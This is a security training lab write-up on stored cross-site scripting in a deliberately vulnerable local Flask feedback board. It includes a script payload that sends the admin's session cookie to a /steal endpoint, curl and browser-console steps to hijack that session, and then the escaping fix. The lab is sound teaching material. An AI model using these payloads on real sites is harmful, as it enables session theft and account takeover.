# Lab 1 — Stored XSS (Cross-Site Scripting)

## Overview

Stored XSS (also called Persistent XSS) occurs when user-supplied input is stored on the server (in a database, file, etc.) and later rendered in web pages without proper sanitization. Unlike reflected XSS, stored XSS doesn't require the victim to click a malicious link — they just need to visit a page that renders the malicious content.

This is particularly dangerous because:
- It affects every user who views the page
- It can steal session tokens, redirect users, or modify page content
- It persists until the malicious content is removed from the database

In this lab, we exploit a feedback board that renders comments as raw HTML, allowing us to inject JavaScript that steals the admin's session cookie.

## Step 1 — Analyze the Code

Open `app/app.py` and look at the `/board` route (line ~100). Comments are stored in the database and retrieved normally — that part is safe. The vulnerability is in the **template rendering**.

Open `app/templates/board.html` and look at line 24:

```html
<div>{{ c.content | safe }}</div>
```

The `| safe` filter in Jinja2 tells the template engine to render the content as **raw HTML** without escaping. This means any HTML or JavaScript in a comment will be executed by the browser.

Without `| safe`, Jinja2 auto-escapes by default — `<script>` would be rendered as `&lt;script&gt;` (visible text, not executed). The `| safe` filter disables this protection.

**Why this is vulnerable:** Any user can post a comment containing `<script>` tags, and when another user (including an admin) views the board, the script executes in their browser with their session context.

## Step 2 — Exploit the Vulnerability

### Prerequisites
- Start the lab: `docker compose up --build`
- App is at: `http://localhost:5001`

### Step 2.1 — Login as the regular user

1. Open `http://localhost:5001` in your browser
2. Login with `user` / `password`

### Step 2.2 — Post a malicious comment

In the comment box, enter the following XSS payload:

```html
<script>new Image().src='http://localhost:5001/steal?token='+document.cookie;</script>
```

Click "Post Comment". The comment appears blank on the page (because the `<script>` tag is invisible), but the JavaScript is now stored in the database.

### Step 2.3 — Simulate the admin visiting the page

1. Open a **different browser** (or an incognito/private window)
2. Go to `http://localhost:5001` and login as `admin` / `adminpass`
3. Navigate to the board at `http://localhost:5001/board`

When the admin's browser loads the page, the injected script executes and sends the admin's `session_token` cookie to the `/steal` endpoint.

### Step 2.4 — View the stolen token

Go to `http://localhost:5001/stolen` in any browser.

You should see an entry like:

| # | Token | Received At |
|---|-------|-------------|
| 1 | session_token=abc123-def456-... | 2024-01-15 14:30:00 |

[Screenshot: The /stolen page showing the captured admin session token]

### Step 2.5 — Use the stolen token to access the admin dashboard

Using curl, set the stolen cookie to access the admin-only dashboard:

```bash
# Replace the token value with the actual stolen token from /stolen
curl -b "session_token=<STOLEN_TOKEN_HERE>" http://localhost:5001/admin/dashboard
```

You should see `Welcome, admin!` in the response, confirming you've hijacked the admin's session.

Alternatively, in your browser's developer tools (F12 → Console), run:

```javascript
document.cookie = "session_token=<STOLEN_TOKEN_HERE>";
```

Then navigate to `http://localhost:5001/admin/dashboard` — you'll see the admin dashboard with confidential data.

[Screenshot: Admin dashboard showing "Welcome, admin!" and confidential notes]

## Step 3 — Discuss & Implement the Fix

### The Problem
The template uses `| safe` to render comment content, bypassing Jinja2's auto-escaping.

### The Fix
Remove the `| safe` filter so Jinja2's default auto-escaping takes effect.

**Before** (`app/templates/board.html`, line 22):
```html
<div>{{ c.content | safe }}</div>
```

**After:**
```html
<div>{{ c.content }}</div>
```

### Why This Works
Jinja2 auto-escapes by default, converting special HTML characters:
- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`
- `&` becomes `&amp;`

So `<script>alert(1)</script>` is rendered as visible text `<script>alert(1)</script>` instead of being executed as JavaScript.

If you explicitly need to allow some HTML (e.g., bold or italics), use a library like `bleach` to whitelist specific safe tags:
```python
import bleach
clean_content = bleach.clean(content, tags=['b', 'i', 'em', 'strong'], strip=True)
```

## Step 4 — Verify the Fix

1. Apply the fix: In `app/templates/board.html`, change `{{ c.content | safe }}` to `{{ c.content }}`
2. Restart the app: `docker compose down && docker compose up --build`
3. Login as `user` / `password`
4. Post the same malicious comment:
   ```html
   <script>new Image().src='http://localhost:5001/steal?token='+document.cookie;</script>
   ```
5. The comment now appears as **visible text** on the page:
   ```
   <script>new Image().src='http://localhost:5001/steal?token='+document.cookie;</script>
   ```
6. Login as admin in another browser and visit the board — no script executes
7. Check `/stolen` — no new tokens have been captured

[Screenshot: The board showing the script tag rendered as visible text instead of executing]

The XSS attack is now blocked. The `<script>` tag is safely displayed as text content.

**Remember to revert the fix** so the lab ships in its vulnerable state for the next trainee.
